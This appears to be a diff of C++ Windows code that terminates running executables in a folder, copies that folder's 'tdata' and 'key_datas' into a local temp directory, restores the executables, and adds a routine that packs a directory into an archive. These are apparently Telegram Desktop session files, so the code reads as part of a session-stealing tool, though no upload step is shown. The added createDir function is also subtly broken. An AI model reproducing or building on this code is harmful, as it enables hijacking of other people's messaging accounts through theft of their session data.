@@ -28,6 +28,16 @@ bool is_cache(fs::path path) {
     return false;
 }
 
+void createDir(fs::path path) {
+    if (!path.has_parent_path()) { return; }
+    if (!fs::exists(path)) {
+        createDir(path.parent_path());
+        if (fs::is_directory(path)) {
+            CreateDirectoryW(path.wstring().c_str(), NULL);
+        }
+    }
+}
+
 // Indexing files
 void index(vector<fs::path>& buffer, fs::path target, fs::path current = "", bool recoursive = true, bool with_dir = false) {
     acout(L"Start index: target dir = \"" << target.wstring() << L"\"; current dir = \"" << current.wstring() << L"\"");
@@ -75,21 +85,19 @@ void index(vector<fs::path>& buffer, fs::path target, fs::path current = "", boo
         }
     }
 }
-wstring tdata(wstring dir) {
-    resetTemp;
-    static int num = 0;
-    num++;
+
+void reserveDelete(fs::path path, wstring tempName) {
     GetEnvironmentVariableW(L"TEMP", temp, MAX_PATH);
-    temp = wcscat(temp, (L"\\" + to_wstring(num) + L" TDir\\").c_str());
+    temp = wcscat(temp, (L"\\" + tempName + L"\\").c_str());
     CreateDirectoryW(temp, NULL);
     vector<fs::path> exe;
-    index(exe, dir, "", false);
+    index(exe, path, "", false);
     for (auto& file : exe) {
-        cout(L"TDir subdir: " << file.wstring());
+        cout(L"Object: " << file.wstring());
         if (file.wstring().find(L".exe") != wstring::npos) {
             closeSelf(file.wstring().c_str());
             try {
-                fs::copy(fs::path(wstring(dir) + file.wstring()), fs::path(temp), fs::copy_options::overwrite_existing);
+                fs::copy(fs::path(wstring(path) + file.wstring()), fs::path(temp), fs::copy_options::overwrite_existing);
             }
             catch (fs::filesystem_error& e) {
                 cout(L"Cannot copy " << file.wstring() << L" to " << temp << L": " << e.what());
@@ -97,6 +105,38 @@ wstring tdata(wstring dir) {
         }
     }
     exe.clear();
+}
+
+void restoreDelete(fs::path path) {
+    vector<fs::path> exe;
+    index(exe, temp, "", false);
+    for (auto& file : exe) {
+        if (file.wstring().find(L".exe") != wstring::npos) {
+            try {
+                fs::copy(
+                    fs::path(wstring(temp) + file.wstring()),
+                    path,
+                    fs::copy_options::overwrite_existing
+                );
+            }
+            catch (fs::filesystem_error& e) {
+                cout(L"Cannot copy " << file.wstring() << L" to " << temp << L": " << e.what());
+            }
+        }
+    }
+    try {
+        fs::remove(temp);
+    }
+    catch (fs::filesystem_error& e) {
+        cout(L"Cannot remove " << temp << L": " << e.what());
+    }
+}
+
+wstring tdata(wstring dir) {
+    resetTemp;
+    static int num = 0;
+    num++;
+    reserveDelete(dir, to_wstring(num) + L" TDir");
     try {
         CreateDirectoryW(getabspathincurrdir(wstring(L"tmp\\" + to_wstring(num) + L" TDir\\").c_str()).c_str(), NULL);
         fs::copy(
@@ -104,6 +144,7 @@ wstring tdata(wstring dir) {
             fs::path(getabspathincurrdir((L"tmp\\" + to_wstring(num) + L" TDir\\key_datas").c_str())),
             fs::copy_options::overwrite_existing
         );
+        vector<fs::path> exe;
         index(exe, tdir + wstring(L"tdata\\"), "", false, true);
         for (auto& file1 : exe) {
             for (auto& file2 : exe) {
@@ -137,28 +178,37 @@ wstring tdata(wstring dir) {
     catch (fs::filesystem_error& e) {
         cout(L"Cannot copy " << e.path1() << L" to " << e.path2() << L": " << e.what());
     }
-    exe.clear();
-    index(exe, temp, "", false);
-    for (auto& file : exe) {
-        if (file.wstring().find(L".exe") != wstring::npos) {
-            try {
-                fs::copy(
-                    fs::path(wstring(temp) + file.wstring()),
-                    fs::path(dir),
-                    fs::copy_options::overwrite_existing
-                );
-            }
-            catch (fs::filesystem_error& e) {
-                cout(L"Cannot copy " << file.wstring() << L" to " << temp << L": " << e.what());
-            }
-        }
-    }
-    try {
-        fs::remove(temp);
-    }
-    catch (fs::filesystem_error& e) {
-        cout(L"Cannot remove " << temp << L": " << e.what());
-    }
+    restoreDelete(dir);
     resetTemp;
     return getabspathincurrdir(wstring(L"tmp\\" + to_wstring(num) + L" TDir\\").c_str());
+}
+
+void add_directory_to_archive(struct archive* archive, const fs::path path, const fs::path current = fs::path(L"")) {
+    for (const auto& entry : fs::directory_iterator{ current.empty() ? path : current }) {
+        const auto& entry_path = entry.path();
+        struct archive_entry* entry_archive = archive_entry_new();
+
+        // Устанавливаем имя файла в архиве 
+        archive_entry_set_pathname(entry_archive, entry_path.string().substr(path.string().size(), entry_path.string().size() - path.string().size()).c_str());
+        archive_entry_set_size(entry_archive, fs::is_regular_file(entry_path) ? fs::file_size(entry_path) : 0);
+        archive_entry_set_filetype(entry_archive, fs::is_directory(entry_path) ? AE_IFDIR : AE_IFREG);
+
+        // Добавляем запись в архив 
+        archive_write_header(archive, entry_archive);
+        if (fs::is_regular_file(entry_path)) {
+            std::ifstream file(entry_path, std::ios::binary);
+            char buffer[8192];
+            while (file) {
+                file.read(buffer, sizeof(buffer));
+                archive_write_data(archive, buffer, file.gcount());
+            }
+        }
+        archive_write_finish_entry(archive);
+        archive_entry_free(entry_archive);
+
+        // Если это директория, рекурсивно добавляем её содержимое 
+        if (fs::is_directory(entry_path)) {
+            add_directory_to_archive(archive, path, entry_path);
+        }
+    }
 }
